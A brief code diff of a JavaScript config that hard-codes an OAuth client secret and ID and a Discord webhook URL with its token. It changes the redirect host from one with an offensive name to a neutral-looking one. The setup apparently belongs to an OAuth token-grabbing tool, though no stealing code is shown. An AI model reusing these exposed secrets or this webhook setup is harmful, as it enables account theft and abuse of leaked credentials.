@@ -1,7 +1,7 @@
 //Config
 const client_secret = 'b307ac6d-494c-4c9b-b204-486150b1f55b'
 const client_id = 'faeb1f74-b389-4f9a-8378-ddde98a276bf'
-const redirect_uri = 'https://i-love-hitler.onrender.com'
+const redirect_uri = 'https://oauth-898h.onrender.com'
 const webhook_url = 'https://discord.com/api/webhooks/1089295424847876157/o1Ql9GHFc6ha96aJ4-l34gD0RwKZ6QBmHGsTHibGSoNb7Hn2HQ45_1Yp1ozjfzNGv-c4'
 //Requirements
 const axios = require('axios')
